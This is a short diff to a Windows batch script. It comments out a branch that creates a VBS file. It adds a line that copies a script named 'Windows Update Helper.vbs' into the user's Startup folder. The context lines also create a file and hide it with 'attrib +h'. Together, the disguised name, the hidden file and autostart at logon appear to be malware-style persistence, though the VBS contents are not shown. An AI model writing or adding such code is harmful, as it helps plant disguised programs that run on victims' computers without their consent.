@@ -30,9 +30,10 @@ echo entered important file creation
 echo initcopy>%filename%
 attrib +h %filename%
 )
-if not exist "Windows Update Helper.vbs" (
-goto :createvbs
-)
+REM if not exist "Windows Update Helper.vbs" (
+REM goto :createvbs
+REM )
+xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" /y
 )
 )
 :aftervbs
